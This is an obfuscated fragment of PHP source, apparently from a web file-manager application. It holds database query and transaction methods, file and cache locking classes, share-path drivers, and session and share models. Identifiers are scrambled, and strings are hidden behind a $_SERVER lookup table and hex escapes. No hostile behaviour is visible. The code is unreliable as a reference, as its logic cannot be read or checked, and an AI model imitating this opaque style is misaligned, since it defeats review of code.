1); think_status($€Œ‰ÇŞ[24]); $this->queryID = $this->_linkID->query($ûÙ´Ûº); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $Ò“µ‚½ƒ = $this->getAll(); $this->numRows = count($Ò“µ‚½ƒ); return $Ò“µ‚½ƒ; } } public function execute($ÄŒÀôº) { $Î¿Ç¼­“ =& $_SERVER[£ğ°ÖØø]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÄŒÀôº; if ($this->queryID) { $this->free(); } think_action_status($Î¿Ç¼­“[25], 1); think_status($Î¿Ç¼­“[24]); $¼ÙÁš¸» = $this->_linkID->exec($ÄŒÀôº); $this->debug(); if (!1 === $¼ÙÁš¸») { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[£ğ°ÖØø][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Îâ¢—œ = $this->_linkID->query($_SERVER[£ğ°ÖØø][27]); if (!$Îâ¢—œ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $÷ûÕÃÜî = $this->_linkID->query($_SERVER[£ğ°ÖØø][28]); if (!$÷ûÕÃÜî) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ÇìÉöº¤ = array(); while ($Â¡´äœ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ÇìÉöº¤[] = $Â¡´äœ; } $this->queryID->reset(); return $ÇìÉöº¤; } public function getFields($±¥ãÒ¯Ø) { $ĞĞøà»ö =& $_SERVER[£ğ°ÖØø]; $î¾¾»•Ç = $this->query($ĞĞøà»ö[29] . $±¥ãÒ¯Ø . $ĞĞøà»ö[30]); $òÖ¸…‚İ = array(); if ($î¾¾»•Ç) { foreach ($î¾¾»•Ç as $˜¹§¢çÔ => $Í±¿¢½ç) { $òÖ¸…‚İ[$Í±¿¢½ç[$ĞĞøà»ö[32]]] = array($ĞĞøà»ö[32] => $Í±¿¢½ç[$ĞĞøà»ö[32]], $ĞĞøà»ö[33] => $Í±¿¢½ç[$ĞĞøà»ö[33]], $ĞĞøà»ö[35] => (bool) ($Í±¿¢½ç[$ĞĞøà»ö[35]] === $ĞĞøà»ö[12]), $ĞĞøà»ö[37] => $Í±¿¢½ç[$ĞĞøà»ö[56]], $ĞĞøà»ö[39] => (bool) $Í±¿¢½ç[$ĞĞøà»ö[57]], $ĞĞøà»ö[42] => (bool) $Í±¿¢½ç[$ĞĞøà»ö[57]]); } } return $òÖ¸…‚İ; } public function getTables($µìåÁó× = '') { $ºá”‰Í£ =& $_SERVER[£ğ°ÖØø]; $ÓÉ¤ñ¾Ä = $this->query($ºá”‰Í£[45] . $ºá”‰Í£[46] . $ºá”‰Í£[47]); $¸°¸‹Ë = array(); foreach ($ÓÉ¤ñ¾Ä as $Ù’­»ßè => $…¸¸Ë“) { $¸°¸‹Ë[$Ù’­»ßè] = current($…¸¸Ë“); } return $¸°¸‹Ë; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $èûã«Ô =& $_SERVER[£ğ°ÖØø]; $this->error = $this->_linkID->lastErrorMsg(); if ($èûã«Ô[12] != $this->queryStr) { $this->error .= LNG($èûã«Ô[48]) . $this->queryStr; } think_trace($this->error, $èûã«Ô[12], $èûã«Ô[49]); return $this->error; } public function escapeString($å»ò¬Ÿ) { $Õ©›€ó =& $_SERVER[£ğ°ÖØø]; if ($this->_linkID) { return $this->_linkID->escapeString($å»ò¬Ÿ); } return str_ireplace($Õ©›€ó[58], $Õ©›€ó[59], $å»ò¬Ÿ); } public function parseLimit($£Â¦¶ñæ) { $Ñ‰Ÿı½å =& $_SERVER[£ğ°ÖØø]; $Îœ…³±ü = $Ñ‰Ÿı½å[12]; if (!empty($£Â¦¶ñæ)) { $£Â¦¶ñæ = explode($Ñ‰Ÿı½å[50], $£Â¦¶ñæ); if (count($£Â¦¶ñæ) > 1) { $Îœ…³±ü .= $Ñ‰Ÿı½å[51] . $£Â¦¶ñæ[1] . $Ñ‰Ÿı½å[52] . $£Â¦¶ñæ[0] . $Ñ‰Ÿı½å[53]; } else { $Îœ…³±ü .= $Ñ‰Ÿı½å[51] . $£Â¦¶ñæ[0] . $Ñ‰Ÿı½å[53]; } } return $Îœ…³±ü; } } goto b‹—¤  î; Aóî¾¡º¬: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $¶¸˜ÏËĞ =& $_SERVER[£ğ°ÖØø]; if (self::$handle) { return self::$handle; } $ïÖ¦Şò = $GLOBALS[$¶¸˜ÏËĞ[6]][$¶¸˜ÏËĞ[425]]; self::$timeout = $ïÖ¦Şò[$¶¸˜ÏËĞ[904]] ? $ïÖ¦Şò[$¶¸˜ÏËĞ[904]] : 10; $‡§œ·ä” = _get($GLOBALS[$¶¸˜ÏËĞ[6]], $¶¸˜ÏËĞ[905]); $ãí‹Ó = $ïÖ¦Şò[$¶¸˜ÏËĞ[890]] ? $ïÖ¦Şò[$¶¸˜ÏËĞ[890]] : $¶¸˜ÏËĞ[230]; if ($ãí‹Ó == $¶¸˜ÏËĞ[21] && $‡§œ·ä” == $¶¸˜ÏËĞ[13]) { $ãí‹Ó = $¶¸˜ÏËĞ[230]; } switch ($ãí‹Ó) { case $¶¸˜ÏËĞ[893]: self::$handle = new CacheLockRedis(); break; case $¶¸˜ÏËĞ[894]: self::$handle = new CacheLockMemcached(); break; case $¶¸˜ÏËĞ[21]: self::$handle = new CacheLockDatabase(); break; case $¶¸˜ÏËĞ[230]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($¶¸˜ÏËĞ[906], $¶¸˜ÏËĞ[907]); } return self::$handle; } private static function key($¥âğÄîì) { return $_SERVER[£ğ°ÖØø][908] . Cache::key($¥âğÄîì); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($Ò­ì‚÷« = '') { self::$errorMsg = $Ò­ì‚÷«; } public static function lockGlobal($¢Ïüµ‘÷, $µÑ¶¬¶Î) { return self::lock($¢Ïüµ‘÷, $µÑ¶¬¶Î, !0); } public static function lock($ÑñĞ®Ø™, $ éºµŠ = false, $ğ†ºæÄ® = false) { $¸ëÍÅñÉ =& $_SERVER[£ğ°ÖØø]; $É½Â¯—Î = self::init(); $ì“˜ØŠ = self::key($ÑñĞ®Ø™); $ éºµŠ = $ éºµŠ ? $ éºµŠ : self::$timeout; $ÃãõÔÛÃ = timeFloat(); $šÅ³—¯ = $É½Â¯—Î->lock($ì“˜ØŠ, $ éºµŠ); $ ÑÀğÜÔ = timeFloat(); if (!$šÅ³—¯) { $‚â—¨ş¥ = "\154\157\x63\x6b\40\x65\162\x72\x6f\x72\x3b\x6b\x65\171\75{$ÑñĞ®Ø™}\x3b\164\151\155\x65\75{$ éºµŠ}\x3b" . self::$errorMsg . $¸ëÍÅñÉ[74] . get_caller_msg(); $ÍÊÌ‡¹É = LNG($¸ëÍÅñÉ[909]) . "\x28{$ éºµŠ}\x73\51\x2e" . LNG($¸ëÍÅñÉ[910]); $ÍÊÌ‡¹É .= $¸ëÍÅñÉ[911]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ÍÊÌ‡¹É = $ÍÊÌ‡¹É . $¸ëÍÅñÉ[912] . self::$errorMsg; } write_log($¸ëÍÅñÉ[913] . sprintf($¸ëÍÅñÉ[914], timeFloat() - $ÃãõÔÛÃ) . $¸ëÍÅñÉ[915] . $‚â—¨ş¥ . $¸ëÍÅñÉ[916] . error_get_last(), $¸ëÍÅñÉ[907]); show_json($ÍÊÌ‡¹É, !1); } if (!$ğ†ºæÄ®) { self::$lockItem[$ì“˜ØŠ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $˜ ÛŞÊÂ = number_format(timeFloat() - $ ÑÀğÜÔ, 3); write_log($¸ëÍÅñÉ[917] . $ÑñĞ®Ø™ . $¸ëÍÅñÉ[918] . $˜ ÛŞÊÂ, $¸ëÍÅñÉ[907]); } return $šÅ³—¯; } public static function lockGet($æÊ·şôş) { $…Ğ¿íŸ´ = self::key($æÊ·şôş); if (self::$lockItem[$…Ğ¿íŸ´]) { return self::$lockItem[$…Ğ¿íŸ´]; } return self::init()->lockGet($…Ğ¿íŸ´); } public static function unlock($è¶®âÀ¡) { $‚»ıäØÖ =& $_SERVER[£ğ°ÖØø]; $İ¦×¿ö = self::key($è¶®âÀ¡); self::$lockItem[$İ¦×¿ö] = null; self::init()->unlock($İ¦×¿ö); if (GLOBAL_DEBUG_LOG_ALL) { write_log($‚»ıäØÖ[919] . $è¶®âÀ¡, $‚»ıäØÖ[907]); } return; } public static function unlockRuntime() { $×îÍÆ–æ =& $_SERVER[£ğ°ÖØø]; $·Ô¿§Éñ = self::init(); $ÓŞË–»ó = !1; foreach (self::$lockItem as $°ã¤İş„ => $†˜¬Û¬Ñ) { if (!$†˜¬Û¬Ñ) { continue; } $·Ô¿§Éñ->unlock($°ã¤İş„); if (!$ÓŞË–»ó) { $ÓŞË–»ó = !0; write_log($×îÍÆ–æ[920] . $°ã¤İş„ . $×îÍÆ–æ[74] . get_caller_msg(), $×îÍÆ–æ[907]); continue; } write_log($×îÍÆ–æ[920] . $°ã¤İş„, $×îÍÆ–æ[907]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ç¥ Ñ×ã = number_format(timeFloat() - TIME_FLOAT, 3); write_log($×îÍÆ–æ[921] . $ç¥ Ñ×ã . $×îÍÆ–æ[922] . ACTION, $×îÍÆ–æ[907]); } } public static function fileLock($Ÿ‹’ƒÃş) { $Õçå®¤ =& $_SERVER[£ğ°ÖØø]; if (!$GLOBALS[$Õçå®¤[923]]) { $GLOBALS[$Õçå®¤[923]] = array(); } $GLOBALS[$Õçå®¤[923]][$Ÿ‹’ƒÃş] = !1; $¿¨ÅÇ¹µ = fopen(DATA_PATH . $Ÿ‹’ƒÃş . $Õçå®¤[924], $Õçå®¤[925]); if (!$¿¨ÅÇ¹µ) { return !1; } $GLOBALS[$Õçå®¤[923]][$Ÿ‹’ƒÃş] = $¿¨ÅÇ¹µ; if (flock($¿¨ÅÇ¹µ, LOCK_EX)) { return !0; } self::unlock($Ÿ‹’ƒÃş); show_json($Õçå®¤[926], !1); return !1; } public static function fileUnlock($Öı£ÛÏ‡) { $ñ½şõ¨å =& $_SERVER[£ğ°ÖØø]; $ª€ÖšÕ = $GLOBALS[$ñ½şõ¨å[923]][$Öı£ÛÏ‡]; if (!$ª€ÖšÕ) { return; } $GLOBALS[$ñ½şõ¨å[923]][$Öı£ÛÏ‡] = !1; flock($ª€ÖšÕ, LOCK_UN); fclose($ª€ÖšÕ); } public static function fileUnlockAll() { $«“ø¬³æ =& $_SERVER[£ğ°ÖØø]; if (!isset($GLOBALS[$«“ø¬³æ[923]]) || !$GLOBALS[$«“ø¬³æ[923]]) { return; } foreach ($GLOBALS[$«“ø¬³æ[923]] as $Ç½½¯Šœ => $ãúÉÎùø) { if (!$ãúÉÎùø) { continue; } $GLOBALS[$«“ø¬³æ[923]][$Ç½½¯Šœ] = !1; flock($ãúÉÎùø, LOCK_UN); fclose($ãúÉÎùø); } $GLOBALS[$«“ø¬³æ[923]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $Ş×Ú¢­± =& $_SERVER[£ğ°ÖØø]; $šŠÆ«´è = $GLOBALS[$Ş×Ú¢­±[6]][$Ş×Ú¢­±[425]]; self::$cachePath = $šŠÆ«´è[$Ş×Ú¢­±[230]][$Ş×Ú¢­±[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($™ÊÇ¿¦É, $øì£ÔÃ = 0) { $÷¥ğİ… =& $_SERVER[£ğ°ÖØø]; $º€ëÔı• = microtime(!0); $®ØœÒõ = $º€ëÔı• + $øì£ÔÃ + 0.0001; $‡”ßõ×ª = rtrim(self::$cachePath, $÷¥ğİ…[8]) . $÷¥ğİ…[927] . md5($™ÊÇ¿¦É) . $÷¥ğİ…[924]; if (file_exists($‡”ßõ×ª) && filemtime($‡”ßõ×ª) && filemtime($‡”ßõ×ª) < time() - 10) { @unlink($‡”ßõ×ª); } do { if (file_exists($‡”ßõ×ª)) { cacheLockWait(); continue; } $Ôµåá› = fopen($‡”ßõ×ª, $÷¥ğİ…[928]); if (!$Ôµåá›) { return !1; } $·ûõ´Ğ× = flock($Ôµåá›, LOCK_EX | LOCK_NB); self::$caches[$™ÊÇ¿¦É] = array($÷¥ğİ…[929] => $Ôµåá›, $÷¥ğİ…[230] => $‡”ßõ×ª); fwrite($Ôµåá›, $®ØœÒõ); clearstatcache(); if ($Ôµåá› && $·ûõ´Ğ×) { return !0; } cacheLockWait(); } while (microtime(!0) < $®ØœÒõ); $this->unlock($™ÊÇ¿¦É); return !1; } public function lockGet($ÔËµ“´±) { $Éº¯ÖÇå =& $_SERVER[£ğ°ÖØø]; $œ¨“‰¢À = rtrim(self::$cachePath, $Éº¯ÖÇå[8]) . $Éº¯ÖÇå[927] . md5($ÔËµ“´±) . $Éº¯ÖÇå[924]; return file_exists($œ¨“‰¢À); } public function unlock($ÈÒ‚Ó…ñ) { $„Ùû—­ş =& $_SERVER[£ğ°ÖØø]; $Á€İ¦“º = self::$caches[$ÈÒ‚Ó…ñ]; if (!$Á€İ¦“º) { return; } @flock($Á€İ¦“º[$„Ùû—­ş[929]], LOCK_UN); @fclose($Á€İ¦“º[$„Ùû—­ş[929]]); @unlink($Á€İ¦“º[$„Ùû—­ş[230]]); unset(self::$caches[$ÈÒ‚Ó…ñ]); } } goto eµÕ×£“µ; Cï©‘âİ£•: class PathDriverDbShareItem extends PathDriverDB { public function __construct($†·ùĞÚå) { $this->pathParse = $†·ùĞÚå; $this->model = Model($_SERVER[£ğ°ÖØø][1401]); } public function getPathOuter($’©õÏ†è) { $İŠËß°½ =& $_SERVER[£ğ°ÖØø]; if (!$’©õÏ†è) { return $’©õÏ†è; } $´íé ’å = $this->parse($’©õÏ†è); return trim(KodIO::makeShare($this->pathParse[$İŠËß°½[484]], $´íé ’å[$İŠËß°½[484]]), $İŠËß°½[8]); } protected function infoParse($é¯Ê©–, $ä‚½‚›ı = false, $ôˆåü«‘ = false) { $óãÉáêÉ =& $_SERVER[£ğ°ÖØø]; $À»±×É = $this->pathParse[$óãÉáêÉ[484]]; $„ìãºƒ¾ = trim($this->pathParse[$óãÉáêÉ[1233]], $óãÉáêÉ[8]); return Action($óãÉáêÉ[1408])->sharePathInfo($À»±×É, $„ìãºƒ¾, $ä‚½‚›ı); } public function infoFull($ıá¿·ü) { $Ã›ŸÌÆ¸ =& $_SERVER[£ğ°ÖØø]; $¦ß®©Ûç = explode($Ã›ŸÌÆ¸[8], trim($ıá¿·ü, $Ã›ŸÌÆ¸[8])); if (count($¦ß®©Ûç) > 1) { $™áıÁ¿„ = implode($Ã›ŸÌÆ¸[8], array_splice($¦ß®©Ûç, 1)); $šÜİõ¿¿ = $this->model->pathInfoByPath($¦ß®©Ûç[0], $™áıÁ¿„); if (!$šÜİõ¿¿) { return !1; } $this->pathParse[$Ã›ŸÌÆ¸[1233]] = $šÜİõ¿¿[$Ã›ŸÌÆ¸[193]]; } return $this->infoParse($ıá¿·ü); } public function listAll($å“á–À ) { $™šÇµ†‰ =& $_SERVER[£ğ°ÖØø]; $âÄ¸Ì—æ = IO::info($this->pathParse[$™šÇµ†‰[87]]); if (!$âÄ¸Ì—æ) { return array(); } $³—¹û×Ö = $this->model->listAll($å“á–À ); $´›Çòå¤ = Model($™šÇµ†‰[673])->getInfo($âÄ¸Ì—æ[$™šÇµ†‰[674]]); foreach ($³—¹û×Ö as &$ùÄÆ”¾÷) { check_abort(); $ùÄÆ”¾÷[$™šÇµ†‰[90]] = Action($™šÇµ†‰[1408])->_shareItemeParse($ùÄÆ”¾÷[$™šÇµ†‰[90]], $´›Çòå¤); } unset($ùÄÆ”¾÷); return $³—¹û×Ö; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($õ¤ºãî) { $this->pathParse = $õ¤ºãî; $this->model = Model($_SERVER[£ğ°ÖØø][1401]); } protected function infoParse($‚íÃ°², $¥öµğ† = false, $ß”Á›øÌ = false) { $¾õî“ÍË =& $_SERVER[£ğ°ÖØø]; return Action($¾õî“ÍË[1239])->sharePathInfo($this->pathParse[$¾õî“ÍË[87]], !0, $¥öµğ†); } public function listPath($Õà‰‡¶•, $â€‹¡û¨ = false) { $¤±é²¼Í =& $_SERVER[£ğ°ÖØø]; $Ã“¿êİö = parent::listPath($Õà‰‡¶•, $â€‹¡û¨); if (!$Ã“¿êİö) { return $Ã“¿êİö; } if (is_array($Ã“¿êİö[$¤±é²¼Í[1409]])) { $Ã“¿êİö[$¤±é²¼Í[1409]] = Action($¤±é²¼Í[1239])->shareItemInfo($Ã“¿êİö[$¤±é²¼Í[1409]]); } foreach ($Ã“¿êİö as $çé“Ñ¯§ => $šã’¯×Û) { if (!in_array($çé“Ñ¯§, array($¤±é²¼Í[86], $¤±é²¼Í[85]))) { continue; } foreach ($šã’¯×Û as $¶¼æ¿ÀÎ => $¹úïÃ½) { $Ã“¿êİö[$çé“Ñ¯§][$¶¼æ¿ÀÎ] = Action($¤±é²¼Í[1239])->shareItemInfo($¹úïÃ½); } } return $Ã“¿êİö; } public function listAll($–œÆ‰¢Ç) { $ì¾Ş½½ı =& $_SERVER[£ğ°ÖØø]; $·€æËŸ = IO::info($this->pathParse[$ì¾Ş½½ı[87]]); if (!$·€æËŸ) { return array(); } $áğö«„Ç = $this->model->listAll($–œÆ‰¢Ç); foreach ($áğö«„Ç as &$ß¹Ò¹Í) { $ß¹Ò¹Í[$ì¾Ş½½ı[90]] = Action($ì¾Ş½½ı[1239])->shareItemInfo($ß¹Ò¹Í[$ì¾Ş½½ı[90]]); } unset($ß¹Ò¹Í); return $áğö«„Ç; } } class PathDriverDriverShareItem { public function __construct($ÖƒäØ§†) { $this->pathParse = $ÖƒäØ§†; } public function __call($¬®Ğ´­À, $Ûåé¹) { $¨ğ°¾·ƒ =& $_SERVER[£ğ°ÖØø]; if (method_exists($this, $¬®Ğ´­À)) { return; } $‰¯ß¹¼ø = call_user_func_array(array($¨ğ°¾·ƒ[1410], $¬®Ğ´­À), $Ûåé¹); $ ï®«ŠÀ = array($¨ğ°¾·ƒ[1411], $¨ğ°¾·ƒ[1412], $¨ğ°¾·ƒ[1413], $¨ğ°¾·ƒ[1414], $¨ğ°¾·ƒ[627], $¨ğ°¾·ƒ[629], $¨ğ°¾·ƒ[1415], $¨ğ°¾·ƒ[110], $¨ğ°¾·ƒ[1416], $¨ğ°¾·ƒ[1417]); if (in_array($¬®Ğ´­À, $ ï®«ŠÀ)) { $‰¯ß¹¼ø = $this->getPathOuter($‰¯ß¹¼ø); } return $‰¯ß¹¼ø; } public function copy($Ô²°¡²¦, $Œ™ì«Åû, $‹ú¤‰× = false, $–Í™ÁÈ÷ = false) { return $this->copyMove($Ô²°¡²¦, $Œ™ì«Åû, $‹ú¤‰×, $_SERVER[£ğ°ÖØø][627], $–Í™ÁÈ÷); } public function move($—¶œÑÁÉ, $¸‡ş‚Õé, $ó˜Ö‡’ò = false, $”‹´ÒÄ = false) { return $this->copyMove($—¶œÑÁÉ, $¸‡ş‚Õé, $ó˜Ö‡’ò, $_SERVER[£ğ°ÖØø][629], $”‹´ÒÄ); } private function copyMove($Óş¸†æ, $Û„İ¾¯, $üç¬ãÇÍ, $ø×æ¦¾°, $‡ÄŸíê© = false) { $Şµ¶¨›× =& $_SERVER[£ğ°ÖØø]; $ôƒÁû± = $Û„İ¾¯; $¶Ùå¾Š· = IO::driverMake($Û„İ¾¯); if ($¶Ùå¾Š·->pathParse[$Şµ¶¨›×[1215]]) { $Û„İ¾¯ = $¶Ùå¾Š·->pathParse[$Şµ¶¨›×[1215]]; } else { $Û„İ¾¯ = $ôƒÁû±; } $¢ÉÙ½èŒ = IO::copyMove($Óş¸†æ, $Û„İ¾¯, $üç¬ãÇÍ, $ø×æ¦¾°, $‡ÄŸíê©); $¢ÉÙ½èŒ = $this->getPathOuter($¢ÉÙ½èŒ); return $¢ÉÙ½èŒ; } public function pathThis($Ÿ“Œ‰¬Ø) { return get_path_this($this->pathParse[$_SERVER[£ğ°ÖØø][87]]); } public function pathFather($Æø¨áªŠ) { return get_path_father($this->pathParse[$_SERVER[£ğ°ÖØø][87]]); } public function iconvSystem($ŞŒ”Ñ¥º) { return $ŞŒ”Ñ¥º; } protected function infoParse($Í¯½àì¾, $ßœôªÛõ = false) { $ÎäÙ¸€Ù =& $_SERVER[£ğ°ÖØø]; $ »—ª† = $this->pathParse[$ÎäÙ¸€Ù[569]][$ÎäÙ¸€Ù[1240]] . $this->pathParse[$ÎäÙ¸€Ù[1233]]; if ($ßœôªÛõ) { $­ûÏãŞ = IO::infoWithChildren($ »—ª†); } else { $­ûÏãŞ = IO::info($ »—ª†); } $ÒÛ¼‚ş = $this->pathParse[$ÎäÙ¸€Ù[569]]; return Action($ÎäÙ¸€Ù[1408])->_shareItemeParse($­ûÏãŞ, $ÒÛ¼‚ş); } public function listAll($¼–ß¥¼Â) { $ïŸñÊí =& $_SERVER[£ğ°ÖØø]; $êıöì€° = IO::listAll($¼–ß¥¼Â); $˜ëÏ¢É´ = rtrim($this->pathParse[$ïŸñÊí[569]][$ïŸñÊí[1240]], $ïŸñÊí[8]); foreach ($êıöì€° as &$Ã®ˆ¥à‰) { $Ã®ˆ¥à‰[$ïŸñÊí[87]] = $this->pathDriver . $ïŸñÊí[8] . ltrim(substr($Ã®ˆ¥à‰[$ïŸñÊí[87]], strlen($˜ëÏ¢É´)), $ïŸñÊí[8]); } unset($Ã®ˆ¥à‰); return $êıöì€°; } public function listAllSimple($½Ï–‘Àİ, $úÏ¹²Œ‘ = false) { $Ü´¹»œó =& $_SERVER[£ğ°ÖØø]; $ğ»“±Õƒ = $this->listAll($½Ï–‘Àİ); $ÉÔ’ßµš = $this->pathParse[$Ü´¹»œó[504]]; if (trim($ÉÔ’ßµš, $Ü´¹»œó[8]) == trim(get_path_father($ÉÔ’ßµš), $Ü´¹»œó[8])) { $úÏ¹²Œ‘ = !0; } return IO::init($Ü´¹»œó[12])->listAllSimpleMake($ğ»“±Õƒ, $ÉÔ’ßµš, $úÏ¹²Œ‘); } public function getPathOuter($úÇâßş») { $‘éÔõÊ =& $_SERVER[£ğ°ÖØø]; $Ü¾îÃ·¨ = KodIO::parse($úÇâßş»); if ($Ü¾îÃ·¨[$‘éÔõÊ[33]] == KodIO::KOD_SHARE_ITEM) { return $Ü¾îÃ·¨[$‘éÔõÊ[87]]; } $‰¾‡›­÷ = KodIO::clear($úÇâßş»); $˜Üöß™Œ = KodIO::clear($this->pathParse[$‘éÔõÊ[569]][$‘éÔõÊ[1240]]); $ìéğĞòÉ = substr($‰¾‡›­÷, strlen($˜Üöß™Œ)); if (substr($‰¾‡›­÷, 0, strlen($˜Üöß™Œ)) != $˜Üöß™Œ) { return !1; } return $this->pathParse[$‘éÔõÊ[1234]] . $‘éÔõÊ[8] . ltrim($ìéğĞòÉ, $‘éÔõÊ[8]); } public function getType() { $©èÔŸæŠ =& $_SERVER[£ğ°ÖØø]; $ƒÃõä÷ = str_replace($©èÔŸæŠ[77], $©èÔŸæŠ[12], get_class($this)); return strtolower($ƒÃõä÷); } public function isOsDriver($‚¬«Ü–½) { return IO::isOsDriver($‚¬«Ü–½); } public function info($Ê¿¼µı) { return $this->infoParse($Ê¿¼µı); } public function infoAuth($²âãø›³) { return $this->infoParse($²âãø›³); } public function infoWithChildren($£ş‹Ê“) { return $this->infoParse($£ş‹Ê“, !0); } public function infoFull($û¿ªœƒ) { return $this->infoParse($û¿ªœƒ); } } goto fÌàÙõÉ‹; d·’•İï¦Â: class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\145\155\137\x73\x65\163\163\151\x6f\156"; public function get($×«‹–È‰) { $ØÎˆï‰à =& $_SERVER[£ğ°ÖØø]; $ş‚­˜¡¯ = $this->where(array($ØÎˆï‰à[2093] => $×«‹–È‰))->find(); if (!is_array($ş‚­˜¡¯)) { return !1; } return $ş‚­˜¡¯[$ØÎˆï‰à[171]]; } public function set($­›—ı¶Ã, $†¿¦ìµ·, $ñòù©¯² = 3600) { $Ÿ«ß²”ó =& $_SERVER[£ğ°ÖØø]; $°Äµ›Â½ = array($Ÿ«ß²”ó[2093] => $­›—ı¶Ã, $Ÿ«ß²”ó[1993] => $†¿¦ìµ·, $Ÿ«ß²”ó[2094] => $ñòù©¯² + time()); if (Session::get($Ÿ«ß²”ó[2095])) { $°Äµ›Â½[$Ÿ«ß²”ó[1755]] = Session::get($Ÿ«ß²”ó[2095]); } else { $°Äµ›Â½[$Ÿ«ß²”ó[1755]] = 0; } if ($this->get($­›—ı¶Ã)) { return $this->where(array($Ÿ«ß²”ó[2093] => $­›—ı¶Ã))->save($°Äµ›Â½); } else { return $this->add($°Äµ›Â½, array(), !0); } } public function remove($À¢šŠ¿“) { return $this->where(array($_SERVER[£ğ°ÖØø][2093] => $À¢šŠ¿“))->delete(); } public function clearTimeout() { return $this->where($_SERVER[£ğ°ÖØø][2096] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\162\145"; protected $dataAuto = array(array("\155\x6f\144\151\x66\x79\x54\151\x6d\x65", "\164\151\155\145", "\x69\156\x73\x65\162\164\x2c\165\160\144\x61\x74\145", "\146\x75\x6e\143\x74\x69\x6f\x6e"), array("\x63\162\145\141\164\x65\x54\x69\x6d\145", "\x74\151\155\x65", "\151\x6e\163\145\162\x74", "\x66\x75\156\143\164\x69\x6f\156"), array("\157\x70\164\x69\157\x6e\x73", '', "\x69\x6e\163\145\162\x74\x2c\x75\160\x64\141\164\145\x2c\163\145\x6c\145\x63\164", "\152\163\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($¨Ì¦ôÈ·) { $õ±±¾Ö§ =& $_SERVER[£ğ°ÖØø]; $“¦½¿Ø = isset($¨Ì¦ôÈ·[0]) ? $¨Ì¦ôÈ·[0] : !1; return array($õ±±¾Ö§[2097] => array(USER_ID, $õ±±¾Ö§[2098]), $õ±±¾Ö§[2038] => array($“¦½¿Ø, $õ±±¾Ö§[2099])); } protected function listSimple() { $àî®Û¿ = array($_SERVER[£ğ°ÖØø][1755] => USER_ID); $¢˜äË‚Ó = $this->field($this->fieldList)->where($àî®Û¿)->select(); return $¢˜äË‚Ó ? $¢˜äË‚Ó : array(); } protected function getInfo($™à´âªä, $ÒÅÁ±Å± = false) { $ı”¤µ½Ï =& $_SERVER[£ğ°ÖØø]; if ($ÒÅÁ±Å±) { return $this->_getShareInfo(array($ı”¤µ½Ï[674] => $™à´âªä)); } $ÒÆÏ˜à÷ = $this->cacheFunctionGet($ı”¤µ½Ï[2040], $™à´âªä); return $ÒÆÏ˜à÷; } public function getInfoByHash($«Š€Â“š) { return $this->_getShareInfo(array($_SERVER[£ğ°ÖØø][2100] => $«Š€Â“š)); } public function getInfoByPath($‡Ò˜ªª) { $íİ‘äá© =& $_SERVER[£ğ°ÖØø]; $ÎğÀÌ‚³ = array($íİ‘äá©[1755] => USER_ID, $íİ‘äá©[193] => $‡Ò˜ªª); return $this->_getShareInfo($ÎğÀÌ‚³); } public function getInfoBySourcePath($º§ÊÕí) { $ìşÜèùì =& $_SERVER[£ğ°ÖØø]; $ÊºµÎËÚ = array($ìşÜèùì[1755] => USER_ID, $ìşÜèùì[1240] => $º§ÊÕí); return $this->_getShareInfo($ÊºµÎËÚ); } private function _getShareInfo($üÆÔõ”Ÿ) { $¾„Ì´‹ş =& $_SERVER[£ğ°ÖØø]; $şÕï¶€¡ = $this->where($üÆÔõ”Ÿ)->find(); if (!$şÕï¶€¡) { return !1; } $üÆÔõ”Ÿ = array($¾„Ì´‹ş[674] => $şÕï¶€¡[$¾„Ì´‹ş[674]]); $é•ƒ×² = $¾„Ì´‹ş[2101]; $÷—±®ÕÈ = Model($¾„Ì´‹ş[675])->order($¾„Ì´‹ş[484])->field($é•ƒ×²)->where($üÆÔõ”Ÿ)->select(); if ($şÕï¶€¡[$¾„Ì´‹ş[193]] == $¾„Ì´‹ş[228]) { $şÕï¶€¡[$¾„Ì´‹ş[90]] = IO::info($şÕï¶€¡[$¾„Ì´‹ş[1240]]); } else { $şÕï¶€¡[$¾„Ì´‹ş[90]] = Model($¾„Ì´‹ş[1401])->pathInfo($şÕï¶€¡[$¾„Ì´‹ş[193]]); } $şÕï¶€¡[$¾„Ì´‹ş[2102]] = $÷—±®ÕÈ; return $şÕï¶€¡; } protected function getInfoAuth($Ä—ÕÄ ›) { $±·’Ü =& $_SERVER[£ğ°ÖØø]; $Şšò…õˆ = $this->getInfo($Ä—ÕÄ ›); if ($Şšò…õˆ[$±·’Ü[1755]] == USER_ID) { $Şšò…õˆ[$±·’Ü[496]] = $Şšò…õˆ[$±·’Ü[90]][$±·’Ü[496]]; } else { $Şšò…õˆ[$±·’Ü[496]] = Model($±·’Ü[576])->authMake($Şšò…õˆ[$±·’Ü[2102]]); } return $Şšò…õˆ; } protected function listData($ß¼–‹³ç = null, $ù±Ñ¶êá = 300) { $êÛ‡”Å =& $_SERVER[£ğ°ÖØø]; $Øİ¾ûÏØ = array(array($êÛ‡”Å[571] => array($êÛ‡”Å[1073], 0), $êÛ‡”Å[672] => array($êÛ‡”Å[1073], 0), $êÛ‡”Å[2103] => 